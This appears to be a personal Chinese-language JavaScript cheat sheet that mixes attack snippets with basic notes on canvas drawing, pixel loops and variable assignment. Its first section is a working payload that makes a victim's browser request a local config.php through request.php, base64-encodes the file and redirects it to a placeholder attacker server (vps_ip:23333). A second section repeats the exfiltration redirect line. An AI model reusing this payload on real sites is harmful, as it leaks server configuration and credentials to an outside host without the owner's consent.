# javascript

## 访问网页

```javascript
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///var/www/html/config.php");
```

## 重定向

` document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);`



## 手册

 https://developer.mozilla.org/ 

 https://www.w3schools.com/ 



## 循环

```javascript
var img = new SimpleImage(200, 200);
for(var pixel of img.values())
{//pixel是img.values()的引用
    pixel.setRed(255);
    pixel.setGreen(255);
    pixel.setBlue(0);
}
print(img);
```





## canvas操作

```javascript
var canvas=document.getElementById("show2");
var context = canvas.getContext('2d');
#init
context.clearRect(0, 0, canvas.width, canvas.height);
#clear canvas
context.font = "30px Arial";
context.fillText("Hello World", 10, 50);
#draw a text


context.fillStyle = "red";
context.fillRect(10, 10, 150, 80);
#draw rectangle
```



## 变量赋值(注意点)

当变量是数字和字符串的时候,会生成一个拷贝,再赋值给目标

但如果对象是数组和对象时,这会将引用赋值给目标,此时修改新变量也会影响到旧变量

